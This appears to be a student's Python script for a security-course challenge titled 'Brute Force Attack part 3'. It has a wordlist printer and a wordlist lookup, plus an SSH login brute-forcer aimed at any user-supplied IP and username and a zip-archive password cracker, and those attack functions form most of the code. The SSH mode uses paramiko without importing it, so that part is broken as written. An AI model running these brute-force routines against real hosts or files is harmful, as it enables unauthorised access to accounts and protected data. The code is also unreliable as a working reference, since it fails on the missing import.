#!/usr/bin/env python3

# Script:                       opschallange 18
# Author:                       Bryanna Fox
# Date of latest revision:      1/31/2024
# Purpose:                      Brute Force Attack part 3

import time
import zipfile

def offensive_mode(word_list_file):
    with open(word_list_file, 'r') as f:
        for word in f:
            word = word.strip()  
            print(word)
            time.sleep(0.5)  

def defensive_mode(search_string, word_list_file):
    with open(word_list_file, 'r') as f:
        word_list = [line.strip() for line in f]

    if search_string in word_list:
        print(f"The string '{search_string}' was found in the word list.")
    else:
        print(f"The string '{search_string}' was not found in the word list.")

def ssh_brute_force(username, ip_address, word_list_file):
    with open(word_list_file, 'r') as f:
        for password in f:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip_address, username=username, password=password)
                print(f"Login successful! Password: {password}")
                ssh.close()
                return password
            except paramiko.AuthenticationException:
                print("Authentication failed.")
            except paramiko.SSHException as e:
                print(f"SSH error: {e}")
            except Exception as e:
                print(f"Error: {e}")
            time.sleep(0.5)

def zip_brute_force(zip_file, word_list_file):
    with zipfile.ZipFile(zip_file, 'r') as zip_ref:
        with open(word_list_file, 'r') as f:
            for password in f:
                password = password.strip()
                print(f"Trying password: {password}")
                try:
                    zip_ref.extractall(pwd=password.encode())
                    print(f"Password cracked! Password: {password}")
                    return password
                except Exception as e:
                    pass

if __name__ == "__main__":
    print("Select mode:")
    print("1. Offensive; Dictionary Iterator")
    print("2. Defensive; Password Recognized")
    print("3. SSH Brute Force")
    print("4. Zip Brute Force")
    mode = input("Enter mode number: ")

    if mode == "1":
        word_list_file = input("Enter the word list file path: ")
        offensive_mode(word_list_file)
    elif mode == "2":
        search_string = input("Enter the string to search: ")
        word_list_file = input("Enter the word list file path: ")
        defensive_mode(search_string, word_list_file)
    elif mode == "3":
        username = input("Enter the username: ")
        ip_address = input("Enter the IP address: ")
        word_list_file = input("Enter the word list file path: ")
        result = ssh_brute_force(username, ip_address, word_list_file)
        if result:
            print(f"Successful login! Password: {result}")
        else:
            print("Unable to find valid password in the word list.")
    elif mode == "4":
        zip_file = input("Enter the path to the password-protected zip file: ")
        word_list_file = input("Enter the word list file path: ")
        result = zip_brute_force(zip_file, word_list_file)
        if result:
            print(f"Password cracked! Password: {result}")
        else:
            print("Unable to crack the password.")
    else:
        print("Invalid mode selected. Please choose 1, 2, 3, or 4.")
